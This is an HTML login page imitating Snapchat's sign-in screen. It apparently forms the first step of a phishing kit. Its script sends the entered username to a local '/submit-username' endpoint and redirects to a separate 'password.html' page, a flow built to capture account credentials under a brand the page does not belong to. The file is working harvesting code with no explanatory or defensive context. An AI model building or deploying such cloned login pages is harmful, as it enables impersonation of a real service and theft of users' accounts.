<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Username Page</title>
  <style>
    /* Body styling */
    body {
      background: #ffffff;
      font-family: 'Arial', sans-serif;
      display: flex;
      flex-direction: column; /* Stack items vertically */
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    /* Card container */
    .card {
      background: white;
      padding: 50px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      text-align: center;
      width: 90%;
      max-width: 350px;
      box-sizing: border-box;
    }

    /* Logo */
   img {
  width: 30%;
  max-width: 70px; /* prevents it from getting too big on large screens */
  height: auto;
  display: block;
  margin: 0 auto 20px;
}


    /* Heading */
    h2 {
      margin-bottom: 25px;
      margin-top: 5;
      color: #303030;
      font-weight: 550;
      letter-spacing: 0.5px;
    }

    /* Form inputs */
    label {
      display: block;
      margin-left: -5px;
      margin-bottom: 8px;
      font-weight: 600;
      font-size: 14px; 
      text-align: left;
      color: #6f6f6f;
    }

    input {
      width: 110%;
      margin-left: -5%;
      padding: 12px;
      margin-bottom: 5px;
      border-radius: 10px;
      border: 1px solid #ffe100;
      font-size: 16px;
      box-sizing: border-box;
    }
  
    /* Hint text */
    .hint {
      font-size: 16px;
      color: #4dafff;
      text-align: center;
      margin-bottom: 25px;
      font-weight: bold;
    }

    /* Button styling */
    button {
      width: 90px;
      padding: 13px;
      background-color: #4dafff;
      color: white;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      font-size: 16px;
      display: block;
      margin: 0 auto;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #0b7dda;
    }

    /* Text below card */
    .below-text {
      margin-top: 20px;
      font-size: 16px;
      color: #000000;
      text-align: center;
    }

    .below-text a {
      color: #0b7dda;
      text-decoration: none;
      font-weight: bold;
    }

    .below-text a:hover {
      text-decoration: underline;
    }

    .footer-note {
      margin-top: 10px;
      font-size: 12px;
      color: #999;
      text-align: center;
    }

    /* Responsive */
    @media (max-width: 400px) {
  .card { padding: 30px; }
  h2 { font-size: 20px; }
  button { width: 80px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="logo2.png" alt="Logo">
    <h2>Log in to Snapchat</h2>
    <form id="usernameForm">
      <label for="username">Username or Email</label>
      <input type="text" id="username" required>
      <p class="hint">Use phone number instead</p>
      <button type="submit">Next</button>
    </form>
  </div>

  <!-- Text below the card -->
  <p class="below-text">Don't have an account? <a href="#">Sign Up</a></p>
  <p class="footer-note">By logging in, you agree to our Terms & Privacy Policy.</p>

  <script>
    const form = document.getElementById('usernameForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      if (!username) { alert('Enter username'); return; }

      await fetch('/submit-username', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });

      window.location.href = 'password.html';
    });
  </script>
</body>
</html>
